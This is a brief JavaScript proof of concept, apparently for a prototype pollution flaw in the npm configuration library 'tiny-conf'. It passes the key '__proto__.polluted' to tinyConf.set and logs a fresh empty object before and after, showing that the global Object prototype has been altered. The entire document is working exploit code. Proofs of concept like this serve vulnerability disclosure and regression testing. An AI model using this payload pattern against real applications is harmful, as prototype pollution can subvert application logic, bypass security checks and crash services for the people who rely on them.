var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const tinyConf = require('tiny-conf');
obj = {};
console.log({}.polluted);
tinyConf.set('__proto__.polluted', 'yes');
console.log({}.polluted);